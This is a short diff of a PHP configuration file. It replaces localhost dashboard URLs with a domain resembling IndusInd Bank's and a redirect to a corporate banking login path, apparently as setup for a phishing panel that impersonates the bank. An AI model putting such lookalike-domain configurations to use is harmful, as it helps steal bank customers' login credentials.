@@ -10,7 +10,7 @@ if (!$connection) {
          die('not conneted to databse');
 }
 
-$domain = "http://localhost/dashboards/";
-$redirects = "http://localhost/dashboards/login";
+$domain = "https://indusind.indusindnet.com/";
+$redirects = "https://indusindbank.indusindnet.com/corp/BANKAWAY.php";
 ?>
 
